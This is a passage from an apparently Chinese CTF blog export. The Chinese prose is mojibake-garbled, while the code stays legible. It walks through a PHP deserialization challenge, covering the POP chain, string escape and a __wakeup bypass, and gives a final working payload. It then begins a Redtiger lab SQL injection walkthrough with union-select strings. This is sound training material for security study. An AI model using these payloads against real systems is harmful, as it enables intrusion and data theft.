class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">&#x27;Yasuo&#x27;</span>))&#123; <span class="comment"># stristr() æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°,this-&gt;nameè¢«å½“ä½œå­—ç¬¦ä¸²ï¼Œä»è€Œè§¦å‘__toString()</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Are you orphan?\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Must Be Yasuo!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>); <span class="comment"># POPé“¾å°¾éƒ¨</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment"># è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ä»è€Œè°ƒç”¨KS()å¾—åˆ°flag</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;KS();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = str_replace(<span class="string">&#x27;\0*\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.chr(<span class="number">0</span>), <span class="variable">$data</span>); <span class="comment"># protectedå’Œprivateçš„å±æ€§è¢«åºåˆ—åŒ–æ—¶å¿…é¡»åŒ…å«\0ã€‚</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0*\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$data</span>, <span class="string">&#x27;name&#x27;</span>)!==<span class="literal">False</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Name Pass\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$player</span> = <span class="keyword">new</span> player(<span class="variable">$username</span>, <span class="variable">$password</span>); <span class="comment"># POPé“¾å¤´éƒ¨</span></span><br><span class="line">    file_put_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), write(serialize(<span class="variable">$player</span>))); </span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&#x27;Welcome %s, your ip is %s\n&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please input the username or password!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// play.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">@<span class="variable">$player</span> = unserialize(read(check(file_get_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])))));</span><br><span class="line">print_r(<span class="variable">$player</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$player</span>-&gt;get_admin() === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;FPX Champion\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The Shy unstoppable\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å…ˆçœ‹index.phpæ–‡ä»¶ï¼Œé‡Œé¢çš„<code>$player = new player($username, $password);</code>æ„æˆäº†POPé“¾çš„å¤´éƒ¨ã€‚ç„¶åçœ‹<code>class.php</code>ï¼Œé¦–å…ˆæ³¨æ„åˆ°<code>system("cat /flag");</code>ï¼Œè¿™å°±æ˜¯POPé“¾çš„å°¾éƒ¨ã€‚æ¥ä¸‹æ¥å°±ä»å°¾åˆ°å¤´æŠŠPOPé“¾å¯»æ‰¾å‡ºæ¥ï¼š</p>
<ol type="1">
<li><p>è¦æƒ³æ‰§è¡Œ<code>system("cat /flag");</code>ï¼Œå¿…é¡»è°ƒç”¨<code>jungle</code>ç±»ä¸­çš„<code>KS()</code>æ–¹æ³•ï¼Œåœ¨åŒä¸€ä¸ªç±»ä¸­ï¼Œå­˜åœ¨ç€ä¸€ä¸ª<code>__toString()</code>çš„é­”æœ¯æ–¹æ³•æ­£å¥½è°ƒç”¨äº†<code>KS()</code>ã€‚</p></li>
<li><p>æ¥ä¸‹æ¥éœ€è¦æ‰¾åˆ°å“ªé‡Œèƒ½å¤Ÿè°ƒç”¨<code>__toString()</code>ï¼Œå½“<code>jungle</code>ç±»è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶ï¼Œå°±ä¼šæ‰§è¡Œè¯¥é­”æœ¯æ–¹æ³•ã€‚<code>midsolo</code>ç±»ä¸­çš„<code>stristr($this-&gt;name, 'Yasuo')</code>ï¼Œå¦‚æœ<code>this_name</code>ä¸º<code>jungle</code>ï¼Œåˆ™èƒ½å¤Ÿè§¦å‘<code>__toString()</code>ã€‚å› æ­¤ï¼Œæ¥ä¸‹æ¥éœ€è¦å¯»æ‰¾å¦‚ä½•è°ƒç”¨<code>midsolo</code>ç±»ä¸­çš„<code>Gank()</code>æ–¹æ³•ã€‚</p></li>
<li><p><code>midsolo</code>ç±»ä¸­çš„<code>Gank()</code>æ–¹æ³•è¢«åŒä¸€ç±»ä¸­çš„<code>__invoke()</code>é­”æœ¯æ–¹æ³•è°ƒç”¨ï¼Œå½“<code>midsolo</code>ç±»è¢«å½“ä½œå‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥é­”æœ¯æ–¹æ³•ã€‚è€Œ<code>topsolo</code>ç±»ä¸­çš„<code>TP()</code>æ–¹æ³•ä¸­çš„<code>$name();</code>èƒ½å¤Ÿå°†ç±»å½“ä½œå‡½æ•°æ‰§è¡Œï¼Œåªéœ€è¦å°†è¯¥ç±»ä¸­çš„<code>$name</code>è®¾ç½®ä¸º<code>midsolo</code>å³å¯ã€‚è€Œ<code>TP()</code>æ–¹æ³•è¢«<code>__destruct()</code>é­”æœ¯æ–¹æ³•è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯å½“ç¨‹åºç»“æŸæ—¶ï¼Œå¦‚æœåˆ›å»ºè¿‡<code>topsolo</code>ç±»å¯¹è±¡ï¼Œåˆ™ä¼šè‡ªåŠ¨è°ƒç”¨<code>__destruct()</code>é­”æœ¯æ–¹æ³•ï¼Œä»è€Œç›´æ¥é¡ºç€POPé“¾get flagã€‚</p></li>
<li><p>POPé“¾åˆ°è¿™å°±å‡ºç°äº†æ–­å±‚ï¼Œé‚£å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ˜¯<code>player</code>ç±»ï¼Œè€Œä¸æ˜¯<code>topsolo</code>ç±»ï¼Œç°åœ¨éœ€è¦æ€è€ƒçš„å°±æ˜¯å¦‚ä½•ä»ä¸€ä¸ªç±»è·³åˆ°å¦ä¸€ä¸ªç±»ï¼è¿™é‡Œå°±æ¶‰åŠåˆ°<strong>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</strong>ï¼</p></li>
<li><p>å°†æ€è·¯æ•´ç†å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ›å»ºtopsoloç±»å¯¹è±¡ï¼Œç»“æŸæ—¶è§¦å‘__destructï¼Œè°ƒç”¨TP </span><br><span class="line">--&gt; TPä¸­çš„$name()è°ƒç”¨__invokeï¼Œä»è€Œè°ƒç”¨Gank </span><br><span class="line">--&gt; Gankä¸­çš„stristrè°ƒç”¨äº†__toStringï¼Œä»è€Œè°ƒç”¨äº†KSï¼Œå¹¶æ‰§è¡Œsystem(&#x27;cat /flag&#x27;)</span><br><span class="line">--&gt; è¾“å‡ºflagï¼Œç»“æŸ</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h1 id="æ„é€ payload">æ„é€ payload</h1>
<hr />
<p>å¤ç°ç¯å¢ƒï¼š</p>
<ul>
<li>Windows11</li>
<li>phpstudy2018</li>
<li><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220415144817.png" /></li>
</ul>
<p>æ³¨æ„ï¼šç‰ˆæœ¬ä¸èƒ½å¤ªä½ï¼Œå¦åˆ™æœ‰çš„é­”æœ¯æ–¹æ³•ä¸ä¼šç”Ÿæ•ˆã€‚å¦‚æœè·Ÿæˆ‘ä¸€æ ·ï¼Œå°±éœ€è¦æŠŠ<code>system(cat /flag)</code>ç¨ä½œä¿®æ”¹ã€‚</p>
<hr />
<p>ç„¶åè¿›è¡Œä»£ç å®¡è®¡ï¼Œæ•´ä½“è¿‡ç¨‹ç®€åŒ–å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$player</span> = <span class="keyword">new</span> player(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">file_put_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), write(serialize(<span class="variable">$player</span>)));</span><br><span class="line">@<span class="variable">$player</span> = unserialize(read(check(file_get_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])))));</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„åˆ°è¿‡ç¨‹ä¸­æœ‰ä¸‰ä¸ªå‡½æ•°<code>read</code>ï¼Œ<code>write</code>ï¼Œ<code>check</code>ï¼Œåœ¨åºåˆ—åŒ–æ—¶ï¼Œè°ƒç”¨<code>write</code>å‡½æ•°<code>$data = str_replace(chr(0)."*".chr(0), '\0*\0', $data);</code>å°†3ä¸ªå­—ç¬¦å˜æˆ5ä¸ªå­—èŠ‚ï¼›ç„¶ååœ¨ååºåˆ—åŒ–æ—¶ï¼Œè°ƒç”¨<code>read</code>å‡½æ•°<code>$data = str_replace('\0*\0', chr(0)."*".chr(0), $data);</code>ï¼Œå°†5ä¸ªå­—èŠ‚å˜ä¸º3ä¸ªå­—èŠ‚ã€‚</p>
<p>ç”Ÿæˆpasswordä¸­éœ€è¦ä¼ å…¥çš„topsoloçš„åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä»£ç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> midsolo();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> jungle;  </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> topsolo(<span class="variable">$b</span>); <span class="comment"># è§¦å‘__invoke</span></span><br><span class="line">print_r(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;topsolo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;midsolo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;jungle&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Lee Sin&quot;</span>;&#125;&#125;&#125; <span class="comment"># *å·å‰åè¿˜æœ‰çœ‹ä¸è§çš„\0ï¼Œ%00æ˜¯\0ç»è¿‡urlç¼–ç çš„ç»“æœ</span></span><br></pre></td></tr></table></figure></p>
<p>ä¿®æ”¹midsoloç±»å±æ€§ä¸ªæ•°ç»•è¿‡<code>__wakeup</code>ï¼Œä¿®æ”¹nameå±æ€§ä¸º16è¿›åˆ¶ï¼Œå¹¶ä¸”éœ€è¦æŠŠå°å†™çš„sæ”¹ä¸ºå¤§å†™Sç»•è¿‡<code>check</code>å‡½æ•° <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POC: O:<span class="number">7</span>:<span class="string">&quot;topsolo&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;%00*%00nam\65&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;midsolo&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;%00*%00nam\65&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;jungle&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;%00*%00nam\65&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Lee Sin&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>ç”Ÿæˆä¸€ä¸ªæ­£å¸¸çš„playerç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$admin</span> = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="string">&#x27;hdf&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="string">&#x27;sdfsdfsdfsdfsdfsdfsdfasdfasddfasfewafs&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> player(<span class="string">&#x27;hdf&#x27;</span>ï¼Œ<span class="string">&#x27;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;%00*%00nam\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">print</span>(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœå¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00user&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;hdf&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00*%00pass&quot;</span>;s:<span class="number">127</span>:<span class="string">&quot;O:7:&quot;</span>topsolo<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:7:&quot;</span>midsolo<span class="string">&quot;:2:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:6:&quot;</span>jungle<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;s:7:&quot;</span>Lee Sin<span class="string">&quot;;&#125;&#125;&#125;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;%00*%00admin&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>æˆ‘ä»¬éœ€è¦æŠŠ<code>O:7:"topsolo"......:7:"Lee Sin";&#125;&#125;&#125;</code>å­—ç¬¦ä¸²æ”¾åˆ°<code>pass</code>å±æ€§ä¸­ï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹ï¼šï¼ˆä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘åšäº†åˆ†è¡Œï¼Œ<code>[]</code>ä¸­çš„å†…å®¹æ˜¯åŸæ¥æ²¡æœ‰ï¼Œæˆ‘æ·»åŠ çš„ï¼‰ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;</span><br><span class="line">s:<span class="number">7</span>:<span class="string">&quot;%00*%00user&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;hdf&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00*%00pass&quot;</span>;s:<span class="number">127</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">[;s:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>pass<span class="string">&quot;;]O:7:&quot;</span>topsolo<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:7:&quot;</span>midsolo<span class="string">&quot;:2:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:6:&quot;</span>jungle<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;s:7:&quot;</span>Lee Sin<span class="string">&quot;;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;%00*%00admin&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œ<code>user</code>çš„å€¼åº”è¯¥ä¸º<code>hdf";s:7:"%00*%00pass";s:127:</code>ï¼Œé™¤äº†æœ¬èº«çš„<code>hdf</code>è¿˜éœ€è¦åŒ…å«22ä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªreadéƒ½ä¼šå‡å°‘2ä¸ªå­—ç¬¦ï¼Œå› æ­¤éœ€è¦read 11æ¬¡ï¼Œä¹Ÿå°±æ˜¯<code>username</code>åº”è¯¥ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hdf\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆpasswordå°±è¯¥ä¸ºï¼ˆæŠŠæ–¹æ¡†çš„å†…å®¹æ·»ä¸Šï¼‰ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;%00*%00nam\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=hdf\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;%00*%00nam\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>admin</code>æ— æ‰€è°“ï¼Œä¸å½±å“ç»“æœã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220415144241.png" /></p>
<p>ç„¶åè®¿é—®<code>play.php</code>æ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220415144222.png" /></p>
<p>è¿™é‡Œæˆ‘å°†<code>system(cat /flag)</code>æ”¹ä¸º<code>echo('you get the flag!!!')</code>ï¼Œå› ä¸ºå¤ç°çš„ä¸»æœºæ˜¯Windowsï¼Œå¹¶ä¸”ä¸å­˜åœ¨flagæ–‡ä»¶ã€‚</p>
<p>å½“ç„¶è¿˜æœ‰è®¸å¤šæ„é€ payloadçš„æ–¹æ³•ï¼Œä¸è¿‡éƒ½æ˜¯å¤§åŒå°å¼‚ã€‚æœ¬é¢˜è€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹éå¸¸çš„å¤šï¼Œå‡ ä¹æ¶‰åŠäº†PHPååºåˆ—åŒ–çš„æ‰€æœ‰çŸ¥è¯†ç‚¹ï¼Œå­—ç¬¦ä¸²é€ƒé€¸ã€POPé“¾ã€è¿›åˆ¶ç»•è¿‡ã€é­”æœ¯æ–¹æ³•ç»•è¿‡</p>
<h1 id="ç›¸å…³é¢˜ç›®">ç›¸å…³é¢˜ç›®</h1>
<ol type="1">
<li>POPé“¾ç®€å•åº”ç”¨ï¼š[[MRCTF2020 Ezpop]]</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHPååºåˆ—åŒ–</tag>
        <tag>POPé“¾</tag>
      </tags>
  </entry>
  <entry>
    <title>Redtiger_Hackit_WriteUp</title>
    <url>/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/</url>
    <content><![CDATA[<p>ç½‘ç«™ï¼šhttps://redtiger.labs.overthewire.org/</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161838.png" /></p>
<span id="more"></span>
<h1 id="level-1">Level-1</h1>
<h2 id="é¢˜ç›®æè¿°">é¢˜ç›®æè¿°</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152754.png" /></p>
<p>ç‚¹å‡» <code>1</code> å‘ç° url å‡ºç° <code>cat=1</code> ï¼Œå¹¶ä¸”é¡µé¢å‡ºç°äº†ä¸€äº›å˜åŒ– <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152853.png" /></p>
<p>url: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level1.php?cat=1</span><br></pre></td></tr></table></figure></p>
<h2 id="æµ‹è¯•æ³¨å…¥ç‚¹">æµ‹è¯•æ³¨å…¥ç‚¹</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cat=1=1</span><br><span class="line">?cat=1=2</span><br></pre></td></tr></table></figure>
<p>å¦‚ä¸Š payloadï¼Œåè€…å‡ºç° <code>This category does not exist!</code>ï¼Œè€Œå‰è€…æ­£å¸¸ï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå¹¶ä¸”ä¸ºæ•°å­—å‹ï¼Œå³æ²¡æœ‰é—­åˆæ–¹å¼ã€‚</p>
<h2 id="æ³¨å…¥è¿‡ç¨‹">æ³¨å…¥è¿‡ç¨‹</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. æµ‹è¯•å¤šå°‘åˆ—ï¼š?cat=1 order by 4</span><br><span class="line">2. æµ‹è¯•æ˜¾ç¤ºä½ï¼š?cat=-1 union select 1,2,3,4</span><br><span class="line">3. æµ‹å¾—æ•°æ®åº“ä¸ºhackitï¼š?cat=-1 union select 1,2,3,database()</span><br></pre></td></tr></table></figure>
